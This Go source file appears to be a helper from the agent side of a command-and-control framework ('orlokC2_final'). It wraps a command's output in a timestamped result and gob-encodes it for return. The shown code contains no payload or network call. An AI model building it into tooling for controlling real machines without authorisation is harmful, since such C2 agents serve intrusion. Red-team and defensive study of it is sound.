package agent

import (
	"bytes"
	"encoding/gob"
	"fmt"
	"time"

	"orlokC2_final/internal/types"
)

// init registers the CommandResult type with GOB
func init() {
	gob.Register(types.CommandResult{})
}

// ExecuteCommand runs a command and returns its results
func ExecuteCommand(name string, cmdFunc func() (string, error)) *types.CommandResult {
	output, err := cmdFunc()
	if err != nil {
		output = fmt.Sprintf("Error executing %s: %v", name, err)
	}

	return &types.CommandResult{
		Command:   name,
		Output:    output,
		Timestamp: time.Now(),
		AgentUUID: "", // Will be filled in by the agent
	}
}

// EncodeResult encodes a CommandResult to GOB format
func EncodeResult(result *types.CommandResult) ([]byte, error) {
	var buf bytes.Buffer
	encoder := gob.NewEncoder(&buf)
	if err := encoder.Encode(result); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
